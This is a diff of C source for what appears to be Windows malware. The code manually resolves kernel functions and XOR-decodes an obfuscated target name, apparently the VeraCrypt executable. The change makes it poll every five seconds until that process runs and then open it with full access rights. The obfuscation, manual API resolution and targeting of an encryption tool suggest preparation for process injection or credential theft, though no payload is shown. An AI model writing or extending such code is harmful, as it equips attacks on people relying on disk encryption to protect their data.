@@ -12,7 +12,6 @@ void test()
 
 int main()
 {
-
     HMODULE hKernel = MyGetKernelModuleHandle();
 
     if (hKernel == NULL)
@@ -21,29 +20,20 @@ int main()
         goto shutdown;
     }
 
-    PopulateKernelFunctionPtrsByOrdinal(hKernel);
-
-    char test_data[14] = {0};
-    double d = 0.00002;
-
-    printf("%p %p\n", test_data, &d);
-
-    getchar();
-    MyMemCpy(test_data, &d, 14);
-
-    getchar();
-
-    return 0;
+    PopulateKernelFunctionPtrsByName(hKernel);
 
     char cVeraCrypt[] = {0x66, 0x55, 0x42, 0x51, 0x73, 0x42, 0x49, 0x40, 0x44, 0x1e, 0x55, 0x48, 0x55, 0x0};
     MyXor(cVeraCrypt, 13, key, 5);
 
-    DWORD dwProcID = FindTargetProcessID(cVeraCrypt);
-
-    if (dwProcID == -1)
+    DWORD dwProcID = -1;
+    while (1)
     {
-        printf("Could not get proc id\n");
-        goto shutdown;
+        dwProcID = FindTargetProcessID(cVeraCrypt);
+
+        if (dwProcID != -1)
+            break;
+
+        pSleep(5000);
     }
 
     HANDLE hProc = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcID);
